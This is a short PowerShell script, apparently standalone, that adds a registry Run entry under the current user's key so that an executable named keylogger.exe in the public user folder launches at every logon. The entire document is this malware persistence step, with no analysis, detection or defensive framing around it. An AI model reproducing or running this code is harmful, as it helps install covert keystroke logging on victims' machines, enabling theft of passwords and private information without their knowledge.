$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$key = "Keylogger"
$value = "C:\Users\Public\keylogger.exe"

# Add the keylogger entry to startup registry
Set-ItemProperty -Path $regPath -Name $key -Value $value
